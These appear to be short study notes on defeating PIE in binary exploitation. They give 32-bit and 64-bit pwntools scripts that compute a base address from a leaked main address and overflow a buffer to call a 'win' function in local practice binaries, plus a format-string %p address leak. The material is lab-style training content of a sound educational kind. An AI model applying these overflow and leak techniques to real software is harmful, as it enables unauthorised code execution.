### PIE

---

PIE - Position Independent Executable, every time memory addrress changes, need to find offset from base address.

```py
#32 Bit
from pwn import *
elf=context.binary=ELF('./vuln-32')
p=process()

p.recvuntil('at: ')
main=int(p.recvline(),16)
elf.address=main-elf.sym['main']

payload=b'A'*32
payload+=p32(elf.sym['win'])
p.sendline(payload)
print(p.clean().decode('latin-1'))
```

```py
#64 Bit
from pwn import *
elf=context.binary=ELF('./vuln-64')
p=process()

p.recvuntil('at: ')
main=int(p.recvline(),16)
elf.address=main-elf.sym['main']

payload=b'A'*40
payload+=p64(elf.sym['win'])
p.sendline(payload)
print(p.clean().decode('latin-1'))
```

#### leak address with format string

---

```py
$ ./vuln-32 
What's your name?
%p %p %p %p %p
Nice to meet you 0xf7eee080 (nil) 0x565d31d5 0xf7eb13fc 0x1
```


